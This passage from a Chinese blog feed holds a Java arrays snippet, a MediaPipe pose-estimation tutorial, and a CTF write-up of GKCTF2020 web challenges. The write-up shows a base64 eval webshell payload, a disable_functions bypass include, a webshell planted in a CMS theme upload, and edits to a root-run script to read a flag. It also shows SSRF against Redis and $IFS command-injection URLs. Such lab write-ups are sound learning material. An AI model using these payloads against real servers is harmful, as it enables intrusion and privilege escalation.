keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>a<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//随机产生0-10的数 动态赋值给数组</span>                    <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//使用数组工具查看值</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数组工具类Arrays"><a href="#数组工具类Arrays" class="headerlink" title="数组工具类Arrays"></a>数组工具类Arrays</h3><h4 id="Arrays-sort-数组名"><a href="#Arrays-sort-数组名" class="headerlink" title="Arrays.sort(数组名)"></a>Arrays.sort(数组名)</h4><pre class="line-numbers language-none"><code class="language-none">注意该数组已经发生改变 变成排序后的        Arrays.sort(a);        System.out.println(Arrays.toString(a));        System.out.println(Arrays.toString(a));&#x2F;&#x2F;使用数组工具查看值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Arrays-copyOf-数组-长度"><a href="#Arrays-copyOf-数组-长度" class="headerlink" title="Arrays.copyOf(数组,长度)"></a>Arrays.copyOf(数组,长度)</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>company</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyText</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>a<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>copy<span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>copy<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>输出<span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI-姿态估计模块学习</title>
      <link href="/2021/11/11/ai-zi-tai-gu-ji-mo-kuai-xue-xi/"/>
      <url>/2021/11/11/ai-zi-tai-gu-ji-mo-kuai-xue-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="python-视觉姿态估计"><a href="#python-视觉姿态估计" class="headerlink" title="python-视觉姿态估计"></a>python-视觉姿态估计</h1><blockquote><p>今天的主角就是 mediapipe模块中的中的solutions.pose</p><p>用法和上一期的hands 基本一样  就当来一遍复习</p></blockquote><h3 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h3><p>cv2.VideoCapture()</p><pre class="line-numbers language-none"><code class="language-none">参数是0表示打开笔记本的内置摄像头,是路径的话表示打开视频mp4等等cap&#x3D;cv2.VideoCapture(0)#内置摄像头并读取其对象  返回两个值一个时是否成功,一个时图片对象is,img&#x3D; cap.read()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cv2.waitKey(1)</p><pre class="line-numbers language-none"><code class="language-none">参数是1 表示延迟1ms 切换到下一帧图像. 0 表示只显示当前帧图像,相当于视频暂停可以利用if(cv2.waitKey(1)&#x3D;&#x3D;ord(&#39; &#39;)):来控制是否关闭<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>读取相关模块</p><pre class="line-numbers language-none"><code class="language-none">import mediapipe as mp #里面有利用的模块mpDraw&#x3D;mp.solutions.drawing_utils #链接标志模块将后来产生的标志位进行连接mpPose&#x3D; mp.solutions.pose #用这个模块进行姿势估计#生成对象pose&#x3D; mpPose.Pose()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相关代码为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2<span class="token keyword">import</span> mediapipe <span class="token keyword">as</span> mp<span class="token keyword">import</span> timempDraw<span class="token operator">=</span> mp<span class="token punctuation">.</span>solutions<span class="token punctuation">.</span>drawing_utilsmpPose<span class="token operator">=</span> mp<span class="token punctuation">.</span>solutions<span class="token punctuation">.</span>posemy_pose<span class="token operator">=</span> mpPose<span class="token punctuation">.</span>Pose<span class="token punctuation">(</span><span class="token punctuation">)</span>cap <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>preTime<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    is_true<span class="token punctuation">,</span>img <span class="token operator">=</span>cap<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    imgRGB<span class="token operator">=</span> cv2<span class="token punctuation">.</span>cvtColor<span class="token punctuation">(</span>img<span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>COLOR_BGR2RGB<span class="token punctuation">)</span><span class="token comment">#将图片BGR转换成RGB 才能利用否则不能利用</span>    res<span class="token operator">=</span> my_pose<span class="token punctuation">.</span>process<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token comment">#套用模块进行加工</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>pose_landmarks<span class="token punctuation">)</span><span class="token punctuation">:</span>        mpDraw<span class="token punctuation">.</span>draw_landmarks<span class="token punctuation">(</span>img<span class="token punctuation">,</span>res<span class="token punctuation">.</span>pose_landmarks<span class="token punctuation">,</span>mpPose<span class="token punctuation">.</span>POSE_CONNECTIONS<span class="token punctuation">)</span>        <span class="token comment">#print(res.pose_landmarks.landmark)打印各自标志位</span>        <span class="token keyword">for</span> <span class="token builtin">id</span><span class="token punctuation">,</span>lm <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>pose_landmarks<span class="token punctuation">.</span>landmark<span class="token punctuation">)</span><span class="token punctuation">:</span>            h<span class="token punctuation">,</span>w<span class="token punctuation">,</span>c<span class="token operator">=</span> img<span class="token punctuation">.</span>shape            cx<span class="token punctuation">,</span>cy<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>lm<span class="token punctuation">.</span>x<span class="token operator">*</span>w<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>lm<span class="token punctuation">.</span>y<span class="token operator">*</span>h<span class="token punctuation">)</span>            cv2<span class="token punctuation">.</span>circle<span class="token punctuation">(</span>img<span class="token punctuation">,</span><span class="token punctuation">(</span>cx<span class="token punctuation">,</span>cy<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>FILLED<span class="token punctuation">)</span>    my_time<span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    fps<span class="token operator">=</span> <span class="token number">1</span><span class="token operator">/</span><span class="token punctuation">(</span>my_time<span class="token operator">-</span>preTime<span class="token punctuation">)</span>    preTime<span class="token operator">=</span> my_time    cv2<span class="token punctuation">.</span>putText<span class="token punctuation">(</span>img<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>fps<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>FONT_HERSHEY_PLAIN<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">"rgylin_img"</span><span class="token punctuation">,</span>img<span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>我们可以利用一个列表来存储相对应关节id 及其对应的位置 ，然后方便寻找 </p></blockquote><p>利用类方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2<span class="token keyword">import</span> mediapipe <span class="token keyword">as</span> mp<span class="token keyword">import</span> time<span class="token keyword">class</span> <span class="token class-name">myPoseDector</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>myDraw<span class="token operator">=</span>mp<span class="token punctuation">.</span>solutions<span class="token punctuation">.</span>drawing_utils        self<span class="token punctuation">.</span>myPose<span class="token operator">=</span> mp<span class="token punctuation">.</span>solutions<span class="token punctuation">.</span>pose        self<span class="token punctuation">.</span>pose<span class="token operator">=</span> self<span class="token punctuation">.</span>myPose<span class="token punctuation">.</span>Pose<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">drawPose</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>img<span class="token punctuation">,</span>isDraw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        imgRGB<span class="token operator">=</span> cv2<span class="token punctuation">.</span>cvtColor<span class="token punctuation">(</span>img<span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>COLOR_BGR2RGB<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>results<span class="token operator">=</span> self<span class="token punctuation">.</span>pose<span class="token punctuation">.</span>process<span class="token punctuation">(</span>imgRGB<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>results<span class="token punctuation">.</span>pose_landmarks<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>isDraw<span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>myDraw<span class="token punctuation">.</span>draw_landmarks<span class="token punctuation">(</span>img<span class="token punctuation">,</span>self<span class="token punctuation">.</span>results<span class="token punctuation">.</span>pose_landmarks<span class="token punctuation">,</span>self<span class="token punctuation">.</span>myPose<span class="token punctuation">.</span>POSE_CONNECTIONS<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">getPosition</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>img<span class="token punctuation">,</span>draw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>my_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>results<span class="token punctuation">.</span>pose_landmarks<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> <span class="token builtin">id</span><span class="token punctuation">,</span> lm <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>results<span class="token punctuation">.</span>pose_landmarks<span class="token punctuation">.</span>landmark<span class="token punctuation">)</span><span class="token punctuation">:</span>                h<span class="token punctuation">,</span> w<span class="token punctuation">,</span> c <span class="token operator">=</span> img<span class="token punctuation">.</span>shape                cx<span class="token punctuation">,</span> cy <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lm<span class="token punctuation">.</span>x <span class="token operator">*</span> w<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lm<span class="token punctuation">.</span>y <span class="token operator">*</span> h<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>my_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">,</span>cx<span class="token punctuation">,</span>cy<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>draw<span class="token punctuation">)</span><span class="token punctuation">:</span>                    cv2<span class="token punctuation">.</span>circle<span class="token punctuation">(</span>img<span class="token punctuation">,</span> <span class="token punctuation">(</span>cx<span class="token punctuation">,</span> cy<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>FILLED<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>my_listcap <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>rgylin_dect<span class="token operator">=</span> myPoseDector<span class="token punctuation">(</span><span class="token punctuation">)</span>preTime <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    is_true<span class="token punctuation">,</span> img <span class="token operator">=</span> cap<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    rgylin_dect<span class="token punctuation">.</span>drawPose<span class="token punctuation">(</span>img<span class="token punctuation">)</span>    rgylin_list<span class="token operator">=</span>rgylin_dect<span class="token punctuation">.</span>getPosition<span class="token punctuation">(</span>img<span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>rgylin_list<span class="token punctuation">)</span><span class="token comment">#得到所有的位置坐标 我们可以利用索引找到对应的 关节</span>    my_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    fps <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">/</span> <span class="token punctuation">(</span>my_time <span class="token operator">-</span> preTime<span class="token punctuation">)</span>    preTime <span class="token operator">=</span> my_time    cv2<span class="token punctuation">.</span>putText<span class="token punctuation">(</span>img<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>fps<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>FONT_HERSHEY_PLAIN<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">"rgylin_img"</span><span class="token punctuation">,</span> img<span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果如图</p><p><img src="https://img-blog.csdnimg.cn/f2f3ffdf6e0f44a59ea006cfcd3865e0.gif" alt="请添加图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web刷题</title>
      <link href="/2021/11/06/web-shua-ti/"/>
      <url>/2021/11/06/web-shua-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="GKCTF2020复现"><a href="#GKCTF2020复现" class="headerlink" title="GKCTF2020复现"></a>GKCTF2020复现</h2><blockquote><p>备赛刷题</p></blockquote><h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><p>首先源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Check_In<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ClassName</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$decode</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Ginkgo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">decode</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token keyword">Eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>乍一看没有反序列unsearialize函数 但是这里直接就可以命令执行了phpinfo()一下</p></blockquote><p>直接可以命令执行</p><p><img src="https://img-blog.csdnimg.cn/646f9f35b3b3447fafc89f78943d11dc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>尝试直接命令执行无果. 经发现是禁了许多函数</p><p><img src="https://img-blog.csdnimg.cn/9834b9b62ac844b199696168c9c90310.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>第一时间想到的就是可以利用蚁剑连马</p><pre class="line-numbers language-none"><code class="language-none">传入eval($_POST[&#39;rgylin&#39;]);  并且进行base编码 &#x3D;&gt;ZXZhbCgkX1BPU1RbJ3JneWxpbiddKTs&#x3D;post 传 rgylin &#x3D;phpinfo();可以命令执行连接但是flag 打开是一片空白<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但发现执行不了</p><p><img src="https://img-blog.csdnimg.cn/75cb6f596417432ca26d4ad01a457a47.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_17,color_FFFFFF,t_70,g_se,x_16" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-LqyNEiql-1636167944696)(C:\Users\ASUS\Desktop\web刷题\图片\QQ截图20211106000523.png)]"></p><blockquote><p>利用 bypass 文件上传并包含 （这里是用php7-gc-bypass）在tmp目录中上传 改成pwn(“/readflag”); 执行</p><p>再去包含此文件即可</p></blockquote><p><img src="https://img-blog.csdnimg.cn/f94a9ac85ab04e71bf3c0b9ea5d95977.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-QK99pEin-1636167944697)(C:\Users\ASUS\Desktop\web刷题\图片\QQ截图20211106001024.png)]"></p><pre class="line-numbers language-none"><code class="language-none">include(&#39;&#x2F;tmp&#x2F;exploit.php&#39;);&#x3D;&gt;base64&#x3D;&gt;aW5jbHVkZSgnL3RtcC9leHBsb2l0LnBocCcpOw&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>拿到flag</p><p>签到都这末费劲0.0</p></blockquote><h2 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h2><p>打开容器是一套商场CMS </p><blockquote><p>发现有后台<br><img src="https://img-blog.csdnimg.cn/b87b53ab764342f29974057e44e2a1f3.png" alt="在这里插入图片描述"></p></blockquote><p>登入成功</p><p>发现有上传主题点,去官网随便下载一个主题并将马写上上传 </p><p>发现成功执行<br><img src="https://img-blog.csdnimg.cn/61ccf4442e1e449289e72d3a244d3251.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>a=system(‘cat /flag’);时候得到了一个假flag</p><p>蚁剑链接</p><p>发现有flag.hint</p><pre class="line-numbers language-none"><code class="language-none">Sat Nov  6 01:20:14 2021Get The RooT,The Date Is Useful!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看一下权限发现auto.sh有root权限</p><p>其内容是</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;shwhile true; do (python &#x2F;var&#x2F;mail&#x2F;makeflaghint.py &amp;) &amp;&amp; sleep 60; done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那末我们可以通过这个脚本来读取flag</p><p>将gk改为</p><pre class="line-numbers language-none"><code class="language-none">gk&#x3D;open(&quot;&#x2F;root&#x2F;flag&quot;,&#39;r&#39;).read();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>便可拿到flag</p><h3 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h3><p>首先打开网页来看 就是一个ssrf </p><p>发现file被过滤了 无法读取文件</p><p>查看源码发现</p><pre class="line-numbers language-none"><code class="language-none">&lt;!--?secret--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传1 得到ip地址</p><p>那就扫一下该网段存活的主机,发现6 存在 那再扫一下端口</p><p><img src="https://img-blog.csdnimg.cn/6d3f6bc9473d4f1c94dd184ea05442c6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>发现6379开放,是ssrf 无疑了</p><blockquote><p>然后就没思路了 之前没怎么做过这方面题参考大佬wp</p></blockquote><p>利用gopherus  GitHub一搜就有</p><p>生成payload</p><p><img src="https://img-blog.csdnimg.cn/c74272ed928e4033badf34208de6f1ad.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>直接打过去 然后访问 得到flag 但这里必须得绕过空格才行   原理不知道为啥</p><p>有$IFS &lt; 等等 </p><pre class="line-numbers language-none"><code class="language-none">10.0.102.6&#x2F;&#x2F;shell.php?rgylin&#x3D;system(&#39;cat$IFS$9&#x2F;flag&#39;);10.0.102.6&#x2F;&#x2F;shell.php?rgylin&#x3D;system(&#39;cat&lt;&#x2F;flag&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/7e021001235c48fa9e626f4aeabe6645.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" 